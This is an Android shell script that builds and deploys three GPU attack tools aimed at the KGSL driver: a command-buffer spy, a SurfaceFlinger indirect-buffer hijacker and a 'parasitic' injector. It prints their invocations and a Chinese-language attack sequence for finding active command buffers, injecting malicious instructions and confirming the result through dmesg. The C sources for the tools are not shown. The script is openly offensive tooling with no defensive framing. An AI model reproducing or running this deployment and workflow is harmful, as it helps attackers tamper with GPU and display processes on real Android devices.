#!/system/bin/sh
# deploy_parasitic_attack.sh
# Build and deploy the parasitic GPU command injection attack tools

echo "╔═══════════════════════════════════════════════════════════════════════╗"
echo "║  Parasitic GPU Command Injection - Build & Deploy                     ║"
echo "╚═══════════════════════════════════════════════════════════════════════╝"
echo ""

WORKDIR="/data/local/tmp"
CC="${WORKDIR}/clang-17/bin/clang"

if [ ! -f "$CC" ]; then
    CC="clang"
fi

echo "[*] Compiler: $CC"
echo "[*] Work directory: $WORKDIR"
echo ""

# Build kgsl_parasitic_inject
echo "[*] Building kgsl_parasitic_inject..."
$CC -o ${WORKDIR}/kgsl_parasitic_inject \
    -O2 -Wall \
    -target aarch64-linux-android31 \
    ${WORKDIR}/kgsl_parasitic_inject.c 2>&1

if [ -f "${WORKDIR}/kgsl_parasitic_inject" ]; then
    chmod 755 ${WORKDIR}/kgsl_parasitic_inject
    echo "[+] Built: kgsl_parasitic_inject"
else
    echo "[-] Build failed: kgsl_parasitic_inject"
fi

# Build surfaceflinger_ib_hijack
echo "[*] Building surfaceflinger_ib_hijack..."
$CC -o ${WORKDIR}/surfaceflinger_ib_hijack \
    -O2 -Wall \
    -target aarch64-linux-android31 \
    ${WORKDIR}/surfaceflinger_ib_hijack.c 2>&1

if [ -f "${WORKDIR}/surfaceflinger_ib_hijack" ]; then
    chmod 755 ${WORKDIR}/surfaceflinger_ib_hijack
    echo "[+] Built: surfaceflinger_ib_hijack"
else
    echo "[-] Build failed: surfaceflinger_ib_hijack"
fi

# Build gpu_cmdbuf_spy
echo "[*] Building gpu_cmdbuf_spy..."
$CC -o ${WORKDIR}/gpu_cmdbuf_spy \
    -O2 -Wall \
    -target aarch64-linux-android31 \
    ${WORKDIR}/gpu_cmdbuf_spy.c 2>&1

if [ -f "${WORKDIR}/gpu_cmdbuf_spy" ]; then
    chmod 755 ${WORKDIR}/gpu_cmdbuf_spy
    echo "[+] Built: gpu_cmdbuf_spy"
else
    echo "[-] Build failed: gpu_cmdbuf_spy"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "                         BUILD COMPLETE"
echo "═══════════════════════════════════════════════════════════════════════"
echo ""
echo "Available tools:"
echo ""
echo "1. GPU Command Buffer Spy (偵察工具):"
echo "   ${WORKDIR}/gpu_cmdbuf_spy monitor 30"
echo "   ${WORKDIR}/gpu_cmdbuf_spy watch 0x2000"
echo ""
echo "2. SurfaceFlinger IB Hijack (注入工具):"
echo "   ${WORKDIR}/surfaceflinger_ib_hijack list"
echo "   ${WORKDIR}/surfaceflinger_ib_hijack single 0"
echo "   ${WORKDIR}/surfaceflinger_ib_hijack monitor 30 0"
echo ""
echo "3. KGSL Parasitic Inject (綜合攻擊):"
echo "   ${WORKDIR}/kgsl_parasitic_inject --scan"
echo "   ${WORKDIR}/kgsl_parasitic_inject --inject"
echo "   ${WORKDIR}/kgsl_parasitic_inject --monitor 30"
echo ""
echo "攻擊流程："
echo "1. 先運行 gpu_cmdbuf_spy monitor 識別活躍的命令緩衝區"
echo "2. 使用 surfaceflinger_ib_hijack 在識別的區域注入惡意指令"
echo "3. 檢查 dmesg 和 GPU 狀態確認攻擊效果"
echo ""
